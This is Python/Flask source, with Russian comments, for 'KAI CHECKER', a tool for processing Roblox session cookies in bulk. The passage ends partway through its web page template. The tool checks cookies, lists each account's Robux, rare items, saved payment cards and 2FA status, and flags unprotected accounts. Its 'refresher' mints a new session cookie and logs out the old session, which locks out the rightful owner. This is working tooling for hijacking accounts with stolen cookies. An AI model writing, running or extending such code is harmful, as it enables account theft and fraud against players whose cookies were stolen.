import requests, json, time, logging, re, os, urllib3, html, sys, asyncio, zipfile, urllib.parse, io, csv
from typing import Dict, List, Optional
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, render_template_string, request, jsonify, send_file, send_from_directory
from io import BytesIO, StringIO
from curl_cffi.requests import AsyncSession

# ===== НАСТРОЙКИ =====
os.makedirs("data/profiles", exist_ok=True)
os.makedirs("data/logs", exist_ok=True)
os.makedirs("input", exist_ok=True)
os.makedirs("output", exist_ok=True)
os.makedirs("downloads", exist_ok=True)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s',
                    handlers=[logging.FileHandler('data/logs/bot.log', encoding='utf-8'), logging.StreamHandler()])
logger = logging.getLogger(__name__)
logging.getLogger("urllib3").setLevel(logging.WARNING)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from curl_cffi import requests as cffi_requests
    HAS_CFFI = True
except ImportError:
    cffi_requests = None
    HAS_CFFI = False

# ===== СЛОВАРЬ ИГР =====
MAIN_GAMES = {
    "blox fruits", "rivals", "adopt me", "pet sim 99",
    "pets go", "mm2", "brookhaven", "fisch", "king legacy", "gpo",
    "blade ball", "bedwars", "jailbreak", "da hood", "tsb",
    "astd", "anime vanguards", "aot revolution", "aut", "aa", "als",
    "combat warriors", "creatures of sonaria", "driving empire", "evade",
    "ro ghoul", "royale high", "toilet td", "trident survival",
    "war tycoon", "yba", "99 nights", "spongebob td", "fnaf td",
    "garden td", "jujutsu infinite", "jujutsu shenanigans",
    "tds", "volleyball legends", "arsenal", "bee swarm",
    "dress to impress"
}

def is_main_game(game_name: str) -> bool:
    if not game_name:
        return False
    g_lower = game_name.lower().strip()
    for mg in MAIN_GAMES:
        if mg in g_lower or g_lower in mg:
            return True
    return False

# ============================================================
# ФУНКЦИИ
# ============================================================

def create_session(cookie: str) -> requests.Session:
    s = requests.Session()
    s.headers.update({
        'Cookie': f'.ROBLOSECURITY={cookie.strip()}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'Accept': 'application/json'
    })
    return s

def get_full_info(cookie: str) -> dict:
    info = {
        'status': '⚠️', 'Username': '?', 'UserID': '?', 'Robux': 0,
        'PendingRobux': 0, 'OutgoingRobuxYear': 0, 'Created': '?',
        'RegistrationDays': 0, 'EmailSet': False, 'TwoFactorEnabled': False,
        'AccountPinEnabled': False, 'PhoneSet': False, 'CardsCount': 0,
        'Country': '?', 'Premium': False, 'Playtime': {}, 'TotalRAP': 0,
        'RareItems': [], 'PurchasedGamepasses': {}, 'TotalInventory': 0,
        'Cookie': cookie, 'SecurityStatus': '⚠️ НЕЗАЩИЩЕННЫЙ'
    }
    try:
        s = requests.Session()
        s.headers.update({
            'Cookie': f'.ROBLOSECURITY={cookie.strip()}',
            'User-Agent': 'Mozilla/5.0',
            'Accept': 'application/json'
        })
        r = s.get('https://users.roblox.com/v1/users/authenticated', timeout=15, verify=False)
        if r.status_code == 200:
            d = r.json()
            info['UserID'] = d.get('id')
            info['Username'] = d.get('name')
            info['status'] = '✅'
        elif r.status_code == 401:
            info['status'] = '❌'
            return info
        elif r.status_code == 403:
            info['status'] = '🚫'
            return info
        else:
            return info
        uid = info['UserID']

        def g(url):
            try:
                r = s.get(url, verify=False, timeout=10)
                return r.json() if r.status_code == 200 else {}
            except:
                return {}

        d = g('https://www.roblox.com/my/settings/json')
        if d:
            info['RegistrationDays'] = d.get('AccountAgeInDays', 0)
            info['Premium'] = d.get('IsPremium', False)
            security = d.get('MyAccountSecurityModel', {})
            info['EmailSet'] = security.get('IsEmailSet', False)
            info['TwoFactorEnabled'] = security.get('IsTwoStepEnabled', False)
            info['AccountPinEnabled'] = security.get('IsAccountPinEnabled', False)
            info['PhoneSet'] = security.get('IsPhoneSet', False)

        rd = g(f'https://users.roblox.com/v1/users/{uid}')
        if rd:
            try:
                dt = datetime.fromisoformat(rd.get('created', '').replace('Z', '+00:00'))
                info['Created'] = dt.strftime('%d.%m.%Y')
            except:
                pass

        rb = g(f'https://economy.roblox.com/v1/users/{uid}/currency')
        if rb:
            info['Robux'] = rb.get('robux', 0)

        td = g(f'https://economy.roblox.com/v2/users/{uid}/transaction-totals?timeFrame=Year&transactionType=summary')
        if td:
            info['PendingRobux'] = td.get('pendingRobuxTotal', 0)
            info['OutgoingRobuxYear'] = td.get('outgoingRobuxTotal', 0)

        cards = g('https://apis.roblox.com/payments-gateway/v1/payment-profiles')
        info['CardsCount'] = len(cards) if isinstance(cards, list) else 0

        country = g('https://users.roblox.com/v1/users/authenticated/country-code')
        if country:
            info['Country'] = country.get('countryCode', '?')

        try:
            tr = 0
            ri = []
            ir = s.get(f'https://inventory.roblox.com/v1/users/{uid}/assets/collectibles?limit=100&sortOrder=Desc', verify=False, timeout=10)
            if ir.status_code == 200:
                data = ir.json()
                for item in data.get('data', []):
                    asset_id = item.get('assetId')
                    rap = item.get('recentAveragePrice', 0) or 0
                    tr += rap
                    if rap >= 1000:
                        ri.append({'name': item.get('name', '?'), 'rap': rap})
                info['TotalInventory'] = len(data.get('data', []))
            info['TotalRAP'] = tr
            ri.sort(key=lambda x: x['rap'], reverse=True)
            info['RareItems'] = ri[:10]
        except:
            pass

        try:
            gp_url = f"https://economy.roblox.com/v2/users/{uid}/transactions?limit=100&transactionType=Purchase"
            cursor = ""
            page = 0
            gamepasses_dict = {}
            
            while page < 10:
                url = gp_url + f"&cursor={cursor}" if cursor else gp_url
                r = s.get(url, verify=False, timeout=12)
                if r.status_code != 200:
                    break
                data = r.json()
                for item in data.get('data', []):
                    details = item.get('details', {})
                    item_type = str(details.get('type', ''))
                    price = abs(item.get('currency', {}).get('amount', 0))
                    if price >= 100 and (item_type in ['GamePass', 'DeveloperProduct'] or 'GamePass' in str(details)):
                        name = details.get('name', 'Товар')
                        place_info = details.get('place', {})
                        place_name = place_info.get('name', 'Неизвестная игра')
                        if place_name not in gamepasses_dict:
                            gamepasses_dict[place_name] = []
                        gamepasses_dict[place_name].append({'name': name, 'price': price})
                cursor = data.get('nextPageCursor')
                if not cursor:
                    break
                page += 1
                time.sleep(0.15)
            
            info['PurchasedGamepasses'] = gamepasses_dict
        except Exception as e:
            logger.error(f"Gamepass error: {e}")

        security_score = 0
        if info.get('EmailSet'): security_score += 1
        if info.get('TwoFactorEnabled'): security_score += 2
        if info.get('AccountPinEnabled'): security_score += 1
        if info.get('PhoneSet'): security_score += 1

        if security_score >= 4:
            info['SecurityStatus'] = '🔒 ВЫСОКИЙ'
        elif security_score >= 2:
            info['SecurityStatus'] = '🔐 СРЕДНИЙ'
        else:
            info['SecurityStatus'] = '⚠️ НИЗКИЙ (НЕЗАЩИЩЕН!)'
    except Exception as e:
        logger.error(f"Err: {e}")
    return info

# ============================================================
# ФОРМАТИРОВАНИЕ ОТЧЁТА
# ============================================================

def format_short_report(info):
    un = html.escape(str(info.get('Username', '?')))
    year = info.get('Created', '????')[-4:] if info.get('Created') else '?'
    status = info.get('status', '⚠️')
    status_icon = '🟢' if status == '✅' else ('🔴' if status == '❌' else '🚫')
    status_text = 'VALID' if status == '✅' else ('INVALID' if status == '❌' else 'BANNED')
    
    r = f"📋 {un} [{year}]\n"
    r += f"{status_icon} {status_text} | 🆔 {info.get('UserID', '?')}\n\n"
    r += f"📅 {info.get('Created', '?')} | 🌍 {info.get('Country', '?')} | {'⭐ Premium' if info.get('Premium') else '❌ Premium'}\n"
    r += f"💰 Robux: ⏣ {info.get('Robux', 0):,} | 💸 Донат: ⏣ {abs(info.get('OutgoingRobuxYear', 0)):,}\n"
    
    rap = info.get('TotalRAP', 0)
    if rap > 0:
        r += f"💎 RAP: ⏣ {rap:,}\n"
    else:
        r += f"💎 RAP: ❌ Нет\n"
    
    r += f"\n🛡️ БЕЗОПАСНОСТЬ:\n"
    r += f"   📧 Почта: {'✅' if info.get('EmailSet') else '❌'}\n"
    r += f"   🔐 2FA: {'✅' if info.get('TwoFactorEnabled') else '❌'}\n"
    r += f"   {info.get('SecurityStatus', '⚠️ НЕЗАЩИЩЕННЫЙ')}\n"
    r += f"   💳 Карты: {info.get('CardsCount', 0)} | 📦 Предметы: {info.get('TotalInventory', 0)}\n"
    
    gp = info.get('PurchasedGamepasses', {})
    main_gp = {game: passes for game, passes in gp.items() if is_main_game(game)}
    
    if main_gp:
        total_sum = sum(sum(p['price'] for p in passes) for passes in main_gp.values())
        r += f"\n📦 ГЕЙМПАССЫ (главные игры):\n"
        for game, passes in list(main_gp.items())[:5]:
            game_total = sum(p['price'] for p in passes)
            r += f"   🎮 {game} (⏣ {game_total:,}):\n"
            for p in passes[:5]:
                r += f"      └ {p['name']} — ⏣ {p['price']:,}\n"
            if len(passes) > 5:
                r += f"      └ ...и ещё {len(passes)-5}\n"
    else:
        r += f"\n📦 ГЕЙМПАССЫ: ❌ Нет\n"
    
    rare = info.get('RareItems', [])
    if rare:
        r += f"\n💎 РЕДКИЕ ПРЕДМЕТЫ ({len(rare)} шт):\n"
        for item in rare[:3]:
            r += f"   └ {item['name']} (⏣ {item['rap']:,})\n"
    else:
        r += f"\n💎 РЕДКИЕ ПРЕДМЕТЫ: ❌ Нет\n"
    
    if len(r) > 3800:
        r = r[:3700] + "\n\n<i>[Сообщение сокращено]</i>"
    
    return f"<blockquote>{r}\n\n<code>{info.get('Cookie', '')}</code></blockquote>"

def generate_full_txt_report(info):
    un = info.get('Username', '?')
    year = info.get('Created', '????')[-4:] if info.get('Created') else '?'
    status = info.get('status', '⚠️')
    status_text = 'VALID' if status == '✅' else ('INVALID' if status == '❌' else 'BANNED')
    
    r = f"╔══════════════════════════════════════════════════════════╗\n"
    r += f"║  🎮 KAI CHECKER — ПОЛНЫЙ ОТЧЁТ                        ║\n"
    r += f"╠══════════════════════════════════════════════════════════╣\n"
    r += f"║  📋 {un} [{year}]\n"
    r += f"║  {status_text} | 🆔 {info.get('UserID', '?')}\n"
    r += f"║  📅 {info.get('Created', '?')} | 🌍 {info.get('Country', '?')}\n"
    r += f"╠══════════════════════════════════════════════════════════╣\n"
    r += f"║  💰 Robux: ⏣ {info.get('Robux', 0):,}\n"
    r += f"║  💸 Донат/год: ⏣ {abs(info.get('OutgoingRobuxYear', 0)):,}\n"
    r += f"║  💎 RAP: ⏣ {info.get('TotalRAP', 0):,}\n"
    r += f"╠══════════════════════════════════════════════════════════╣\n"
    r += f"║  🛡️ БЕЗОПАСНОСТЬ:\n"
    r += f"║  📧 Почта: {'✅' if info.get('EmailSet') else '❌'} | 🔐 2FA: {'✅' if info.get('TwoFactorEnabled') else '❌'}\n"
    r += f"║  {info.get('SecurityStatus', '⚠️ НЕЗАЩИЩЕННЫЙ')}\n"
    r += f"║  💳 Карты: {info.get('CardsCount', 0)} | 📦 Предметы: {info.get('TotalInventory', 0)}\n"
    r += f"╠══════════════════════════════════════════════════════════╣\n"
    r += f"║  📦 ВСЕ ГЕЙМПАССЫ:\n"
    
    gp = info.get('PurchasedGamepasses', {})
    if gp:
        for game, passes in gp.items():
            game_total = sum(p['price'] for p in passes)
            r += f"║  🎮 {game} (⏣ {game_total:,}):\n"
            for p in passes[:5]:
                r += f"║      └ {p['name']} — ⏣ {p['price']:,}\n"
            if len(passes) > 5:
                r += f"║      └ ...и ещё {len(passes)-5}\n"
    else:
        r += f"║  ❌ Нет геймпассов\n"
    
    rare = info.get('RareItems', [])
    if rare:
        r += f"╠══════════════════════════════════════════════════════════╣\n"
        r += f"║  💎 РЕДКИЕ ПРЕДМЕТЫ ({len(rare)} шт):\n"
        for item in rare[:10]:
            r += f"║    └ {item['name']} (⏣ {item['rap']:,})\n"
    
    r += f"╚══════════════════════════════════════════════════════════╝\n\n"
    r += f"🍪 COOKIE:\n{info.get('Cookie', '')}"
    return r

def save_txt(info):
    un = re.sub(r'[<>:"/\\|?*]', '_', str(info.get('Username', '?')))
    fn = f"roblox_{un}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(fn, 'w', encoding='utf-8') as f:
        f.write(generate_full_txt_report(info))
    return fn

# ============================================================
# ФРЕШЕР
# ============================================================

async def refresh_roblox_cookie(old_cookie: str, kill_old: bool = True) -> tuple[bool, str, str]:
    if not HAS_CFFI:
        return False, None, "❌ Установите curl_cffi"
    
    logs = []
    headers_base = {
        "Cookie": f".ROBLOSECURITY={old_cookie.strip()}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Origin": "https://www.roblox.com",
        "Referer": "https://www.roblox.com/"
    }
    
    async with AsyncSession(impersonate="chrome120") as session:
        # ===== 1. CSRF =====
        csrf_token = None
        for attempt in range(3):
            try:
                r_csrf = await session.post("https://auth.roblox.com/v2/logout", headers=headers_base, timeout=10)
                csrf_token = r_csrf.headers.get("x-csrf-token")
                if csrf_token:
                    break
                logs.append(f"Попытка {attempt+1}: CSRF не получен")
                await asyncio.sleep(0.5)
            except Exception as e:
                logs.append(f"Попытка {attempt+1}: {str(e)}")
        
        if not csrf_token:
            return False, None, "❌ CSRF token не получен после 3 попыток"
        
        # ===== 2. TICKET =====
        ticket_headers = headers_base.copy()
        ticket_headers.update({
            "x-csrf-token": csrf_token,
            "RBXAuthenticationNegotiation": "1",
            "Content-Type": "application/json"
        })
        
        ticket = None
        for attempt in range(3):
            try:
                r_ticket = await session.post("https://auth.roblox.com/v1/authentication-ticket", headers=ticket_headers, json={}, timeout=10)
                ticket = r_ticket.headers.get("rbx-authentication-ticket")
                if ticket:
                    break
                logs.append(f"Попытка {attempt+1}: Ticket не получен")
                await asyncio.sleep(0.5)
            except Exception as e:
                logs.append(f"Попытка {attempt+1}: {str(e)}")
        
        if not ticket:
            return False, None, "❌ Ticket не получен"
        
        # ===== 3. REDEEM =====
        redeem_headers = {
            "User-Agent": "Roblox/WinInet",
            "RBXAuthenticationNegotiation": "1",
            "Content-Type": "application/json"
        }
        
        new_cookie = None
        for attempt in range(3):
            try:
                r_redeem = await session.post("https://auth.roblox.com/v1/authentication-ticket/redeem", headers=redeem_headers, json={"authenticationTicket": ticket}, timeout=10)
                set_cookie = r_redeem.headers.get("set-cookie", "")
                if ".ROBLOSECURITY=" in set_cookie:
                    parts = set_cookie.split(".ROBLOSECURITY=")
                    if len(parts) > 1:
                        new_cookie = parts[1].split(";")[0]
                        if new_cookie and new_cookie != old_cookie:
                            break
                logs.append(f"Попытка {attempt+1}: Новый кук не получен")
                await asyncio.sleep(0.5)
            except Exception as e:
                logs.append(f"Попытка {attempt+1}: {str(e)}")
        
        if not new_cookie or new_cookie == old_cookie:
            return False, None, "❌ Не удалось получить новый кук"
        
        # ===== 4. KILL OLD =====
        if kill_old:
            try:
                await session.post("https://auth.roblox.com/v2/logout", headers=ticket_headers, timeout=5)
                logs.append("✅ Старая сессия убита")
            except:
                logs.append("⚠️ Не удалось убить старую сессию")
        else:
            logs.append("ℹ️ Старая сессия сохранена")
        
        return True, new_cookie, "\n".join(logs)

def refresh_cookie_sync(cookie: str, kill_old: bool = True) -> tuple[bool, str, str]:
    loop = None
    try:
        if sys.platform == 'win32':
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        res = loop.run_until_complete(refresh_roblox_cookie(cookie, kill_old))
        return res
    except Exception as e:
        return False, None, f"[ERROR] {e}"
    finally:
        if loop and not loop.is_closed():
            loop.close()

# ============================================================
# ВЕБ-СЕРВЕР
# ============================================================

app = Flask(__name__)

HTML = """<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KAI CHECKER</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,400;0,600;0,700;1,700;1,800;1,900&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            padding: 24px;
            background: #0b081a;
            background-image: radial-gradient(circle at 10% 20%, #1a1040 0%, #0b081a 80%);
        }
        /* ===== РАМКА ВОКРУГ ВСЕГО ===== */
        .kai-wrapper {
            max-width: 1400px;
            margin: 0 auto;
            padding: 30px;
            background: rgba(18, 10, 40, 0.85);
            backdrop-filter: blur(16px);
            border: 2px solid #6c5ce7;
            border-radius: 32px;
            box-shadow: 0 0 60px rgba(108, 92, 231, 0.25), inset 0 0 60px rgba(108, 92, 231, 0.05);
        }
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: #1a1040; border-radius: 8px; }
        ::-webkit-scrollbar-thumb { background: #a855f7; border-radius: 8px; }

        /* ===== ШАПКА ===== */
        .header {
            display: flex; justify-content: space-between; align-items: center;
            padding: 20px 0 16px; border-bottom: 1px solid #2a1a50;
            margin-bottom: 30px;
        }
        .logo {
            font-family: 'Poppins', sans-serif;
            font-size: 34px;
            font-weight: 900;
            font-style: italic;
            background: linear-gradient(135deg, #c084fc, #f472b6);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .logo span {
            font-weight: 400;
            font-style: normal;
            -webkit-text-fill-color: #a78bfa;
        }

        /* ===== ВКЛАДКИ ===== */
        .tabs {
            display: flex; gap: 12px; flex-wrap: wrap; margin-bottom: 28px;
        }
        .tab {
            padding: 10px 24px;
            background: rgba(26, 16, 64, 0.6);
            border: 1px solid #2a1a50;
            border-radius: 40px;
            color: #9880c0;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            transition: all 0.25s;
            user-select: none;
        }
        .tab:hover { border-color: #a855f7; color: #fff; transform: translateY(-2px); }
        .tab.active {
            border-color: #c084fc;
            background: rgba(168, 85, 247, 0.15);
            color: #c084fc;
            box-shadow: 0 0 20px rgba(168,85,247,0.15);
        }

        .tab-content { display: none; animation: fadeUp 0.3s ease; }
        .tab-content.active { display: block; }
        @keyframes fadeUp { 0% { opacity: 0; transform: translateY(12px); } 100% { opacity: 1; transform: translateY(0); } }

        /* ===== КАРТОЧКИ ===== */
        .card {
            background: rgba(18, 10, 40, 0.7);
            backdrop-filter: blur(12px);
            border: 1px solid #2a1a50;
            border-radius: 20px;
            padding: 28px 30px;
            margin-bottom: 24px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
        }
        .card:hover { border-color: #4a2a70; }
        .card h2 {
            font-family: 'Poppins', sans-serif;
            font-weight: 700;
            font-style: italic;
            font-size: 20px;
            color: #d4c0ff;
            margin-bottom: 18px;
            display: flex; align-items: center; gap: 10px;
        }

        /* ===== КНОПКИ ===== */
        .btn {
            padding: 12px 28px;
            border: none;
            border-radius: 40px;
            font-size: 14px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.25s;
            display: inline-flex;
            align-items: center;
            gap: 10px;
        }
        .btn-primary {
            background: linear-gradient(135deg, #a855f7, #d946ef);
            color: #fff;
            box-shadow: 0 8px 24px rgba(168,85,247,0.25);
        }
        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 12px 32px rgba(168,85,247,0.4); }
        .btn-secondary {
            background: rgba(255,255,255,0.06);
            border: 1px solid #2a1a50;
            color: #d4c0ff;
        }
        .btn-secondary:hover { background: rgba(255,255,255,0.1); }

        /* ===== ПОЛЯ ВВОДА ===== */
        textarea, .upload-area {
            width: 100%;
            padding: 14px 16px;
            background: #0d0722;
            border: 1px solid #2a1a50;
            border-radius: 14px;
            color: #e0d6ff;
            font-family: 'Inter', monospace;
            font-size: 14px;
            resize: vertical;
            transition: 0.2s;
        }
        textarea:focus, .upload-area:focus-within {
            border-color: #a855f7;
            outline: none;
            box-shadow: 0 0 0 3px rgba(168,85,247,0.2);
        }
        .upload-area {
            min-height: 100px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            border-style: dashed;
            gap: 6px;
            text-align: center;
        }
        .upload-area p { pointer-events: none; color: #9880c0; }
        .upload-area strong { color: #c084fc; }

        /* ===== РЕЗУЛЬТАТЫ ===== */
        .result-box {
            background: #0d0722;
            border: 1px solid #2a1a50;
            border-radius: 16px;
            padding: 18px;
            margin-top: 20px;
            max-height: 420px;
            overflow-y: auto;
            font-family: 'Inter', monospace;
            font-size: 13px;
            white-space: pre-wrap;
            word-break: break-word;
            transition: 0.2s;
        }
        .result-box.success { border-color: #4ade80; }
        .result-box.error { border-color: #f87171; }
        .result-box .valid { color: #4ade80; }
        .result-box .invalid { color: #f87171; }
        .result-box .info { color: #a78bfa; }

        /* ===== КОПИРОВАНИЕ ===== */
        .cookie-output {
            display: flex;
            align-items: center;
            gap: 14px;
            flex-wrap: wrap;
            background: #0d0722;
            padding: 12px 16px;
            border-radius: 14px;
            border: 1px solid #2a1a50;
            margin-top: 12px;
        }
        .cookie-output code {
            flex: 1;
            word-break: break-all;
            color: #c084fc;
            font-size: 13px;
        }
        .cookie-output .copy-btn {
            background: rgba(168,85,247,0.2);
            border: none;
            color: #c084fc;
            padding: 6px 16px;
            border-radius: 30px;
            font-weight: 600;
            font-size: 13px;
            cursor: pointer;
            transition: 0.2s;
            white-space: nowrap;
        }
        .cookie-output .copy-btn:hover {
            background: rgba(168,85,247,0.4);
            color: #fff;
        }

        /* ===== ПРОГРЕСС ===== */
        .progress-bar {
            margin-top: 12px;
            background: #0d0722;
            border-radius: 40px;
            height: 6px;
            overflow: hidden;
            border: 1px solid #1a1040;
        }
        .progress-bar .fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #a855f7, #ec4899);
            transition: width 0.3s ease;
        }

        /* ===== ФРЕШЕР (СТИЛЬ rblxrefresh) ===== */
        .fresh-card {
            background: rgba(12, 12, 24, 0.9);
            border: 1px solid #1f1f3a;
            border-radius: 16px;
            padding: 24px;
            margin-bottom: 20px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.6);
        }
        .fresh-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 12px;
            margin-bottom: 18px;
        }
        .fresh-header h2 {
            font-family: 'Poppins', sans-serif;
            font-weight: 700;
            font-style: italic;
            font-size: 22px;
            color: #e8e0ff;
            margin: 0;
        }
        .method-group {
            display: flex;
            gap: 6px;
            background: #0a0a18;
            padding: 4px;
            border-radius: 40px;
            border: 1px solid #1a1a2e;
        }
        .method-btn {
            padding: 8px 20px;
            border: none;
            border-radius: 30px;
            background: transparent;
            color: #6a6a8a;
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.2s;
        }
        .method-btn.active {
            background: linear-gradient(135deg, #6c5ce7, #a855f7);
            color: #fff;
            box-shadow: 0 4px 16px rgba(108,92,231,0.3);
        }
        .method-btn:hover:not(.active) { color: #c8c0ff; }

        .fresh-textarea {
            width: 100%;
            min-height: 80px;
            padding: 14px 16px;
            background: #0a0a18;
            border: 1px solid #1a1a2e;
            border-radius: 12px;
            color: #d0d0e0;
            font-family: 'Inter', monospace;
            font-size: 14px;
            resize: vertical;
            transition: 0.2s;
        }
        .fresh-textarea:focus {
            border-color: #6c5ce7;
            outline: none;
            box-shadow: 0 0 0 3px rgba(108,92,231,0.15);
        }

        .fresh-controls {
            display: flex;
            flex-wrap: wrap;
            gap: 12px;
            align-items: center;
            margin-top: 16px;
        }
        .btn-start {
            background: linear-gradient(135deg, #00b894, #00a381);
            color: #fff;
            padding: 10px 32px;
            border: none;
            border-radius: 40px;
            font-weight: 700;
            font-size: 14px;
            cursor: pointer;
            transition: 0.2s;
        }
        .btn-start:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 8px 24px rgba(0,184,148,0.3); }
        .btn-start:disabled { opacity: 0.4; cursor: not-allowed; }
        .btn-stop {
            background: #1a1a2e;
            color: #6a6a8a;
            padding: 10px 24px;
            border: 1px solid #2a2a4a;
            border-radius: 40px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            transition: 0.2s;
        }
        .btn-stop:hover:not(:disabled) { background: #2a2a4a; color: #fff; }
        .btn-stop:disabled { opacity: 0.3; cursor: not-allowed; }
        .btn-download {
            background: transparent;
            color: #6c5ce7;
            padding: 10px 20px;
            border: 1px solid #2a2a4a;
            border-radius: 40px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            transition: 0.2s;
            margin-left: auto;
        }
        .btn-download:hover { background: #1a1a3a; border-color: #6c5ce7; }
        .fresh-status {
            color: #6a6a8a;
            font-size: 14px;
            margin-left: 8px;
        }

        .fresh-progress {
            margin-top: 16px;
            background: #0a0a18;
            border-radius: 40px;
            height: 8px;
            overflow: hidden;
            border: 1px solid #1a1a2e;
        }
        .fresh-progress .fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #6c5ce7, #a855f7, #ec4899);
            transition: width 0.3s ease;
        }
        .fresh-stats {
            display: flex;
            gap: 24px;
            margin-top: 10px;
            font-size: 13px;
            color: #6a6a8a;
        }
        .fresh-stats strong { color: #d0d0e0; }
        .fresh-stats .valid { color: #00b894; }
        .fresh-stats .invalid { color: #ff6b6b; }
        .fresh-stats .errors { color: #feca57; }

        .fresh-history {
            margin-top: 20px;
            border-top: 1px solid #1a1a2e;
            padding-top: 16px;
        }
        .fresh-history h3 {
            font-family: 'Poppins', sans-serif;
            font-weight: 700;
            font-style: italic;
            font-size: 16px;
            color: #a78bfa;
            margin-bottom: 12px;
        }
        .history-list {
            max-height: 200px;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            gap: 6px;
        }
        .history-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 14px;
            background: #0a0a18;
            border-radius: 10px;
            border-left: 3px solid #6c5ce7;
            font-size: 13px;
            color: #b0b0c8;
            flex-wrap: wrap;
            gap: 6px;
        }
        .history-item .time { color: #6a6a8a; font-size: 12px; }
        .history-item .ok { color: #00b894; }
        .history-item .fail { color: #ff6b6b; }

        .footer {
            text-align: center;
            padding: 30px 0 12px;
            color: #4a3a6a;
            font-size: 13px;
            border-top: 1px solid #1a1040;
            margin-top: 30px;
        }
        @media (max-width: 640px) {
            .card, .fresh-card { padding: 18px; }
            .header { flex-direction: column; align-items: start; gap: 10px; }
            .btn-download { margin-left: 0; }
        }
    </style>
</head>
<body>
<div class="kai-wrapper">

    <!-- ===== ШАПКА ===== -->
    <div class="header">
        <div class="logo">KAI <span>CHECKER</span></div>
        <div style="color:#4a3a6a; font-size:14px;">⚡ PRO</div>
    </div>

    <!-- ===== ВКЛАДКИ ===== -->
    <div class="tabs">
        <div class="tab active" data-tab="checker">🔍 Чекер</div>
        <div class="tab" data-tab="fresher">🔄 Фрешер</div>
        <div class="tab" data-tab="validator">✅ Валидатор</div>
        <div class="tab" data-tab="tools">🧰 Инструменты</div>
    </div>

    <!-- ========================================================== -->
    <!-- ===== ЧЕКЕР ============================================== -->
    <!-- ========================================================== -->
    <div class="tab-content active" id="tab-checker">
        <div class="card">
            <h2>🔍 Проверка куков</h2>
            <div style="display:flex; flex-wrap:wrap; gap:18px;">
                <div style="flex:2;">
                    <textarea id="manualCookies" placeholder="Вставь куки сюда (по одному или несколько) ..." rows="4" style="width:100%;"></textarea>
                    <div style="margin-top:8px;color:#4a3a6a;font-size:13px;">или загрузи .txt</div>
                </div>
                <div style="flex:1;">
                    <div class="upload-area" id="fullArea" onclick="document.getElementById('fullFile').click()">
                        <p>📁 <strong>Загрузить .txt</strong></p>
                        <p style="font-size:12px;">.ROBLOSECURITY или _|WARNING</p>
                    </div>
                    <input type="file" id="fullFile" accept=".txt" style="display:none;">
                </div>
            </div>
            <div style="margin-top:18px; display:flex; gap:12px; flex-wrap:wrap;">
                <button class="btn btn-primary" onclick="runFullcheck()">🚀 Запустить проверку</button>
                <button class="btn btn-secondary" onclick="document.getElementById('manualCookies').value='';document.getElementById('fullFile').value='';">🧹 Очистить</button>
            </div>
            <div class="progress-bar"><div class="fill" id="checkerProgress"></div></div>
            <div class="result-box" id="fullcheckResult"></div>
            <div id="checkerHistoryContainer" style="margin-top:16px; display:none;">
                <h3 style="color:#a78bfa; font-size:15px; margin-bottom:10px;">📜 История проверок</h3>
                <div id="checkerHistoryList" style="max-height:200px; overflow-y:auto; display:flex; flex-direction:column; gap:4px;"></div>
                <button class="btn btn-secondary" onclick="clearCheckerHistory()" style="margin-top:10px; padding:6px 16px; font-size:12px;">🗑️ Очистить</button>
            </div>
        </div>
    </div>

    <!-- ========================================================== -->
    <!-- ===== ФРЕШЕР (СТИЛЬ rblxrefresh) ========================= -->
    <!-- ========================================================== -->
    <div class="tab-content" id="tab-fresher">
        <div class="fresh-card">
            <div class="fresh-header">
                <h2>🔄 Mass Refresher</h2>
                <div class="method-group">
                    <button class="method-btn active" id="ticketMethod" onclick="setFreshMethod('ticket')">Ticket method</button>
                    <button class="method-btn" id="logoutMethod" onclick="setFreshMethod('logout')">Logout method</button>
                </div>
            </div>
            <textarea class="fresh-textarea" id="freshInput" placeholder="Вставь куки для обновления (по одному на строку)"></textarea>
            <div class="fresh-controls">
                <button class="btn-start" id="freshStartBtn" onclick="startFresh()">▶ Start</button>
                <button class="btn-stop" id="freshStopBtn" disabled onclick="stopFresh()">■ Stop</button>
                <button class="btn-download" onclick="downloadFreshResults()">📥 Download ZIP</button>
                <span class="fresh-status" id="freshStatus">Ready</span>
            </div>
            <div class="fresh-progress"><div class="fill" id="freshProgressFill"></div></div>
            <div class="fresh-stats">
                <span>Progress: <strong id="freshProgressText">0%</strong></span>
                <span class="valid">✅ Valid: <strong id="freshValidCount">0</strong></span>
                <span class="invalid">❌ Invalid: <strong id="freshInvalidCount">0</strong></span>
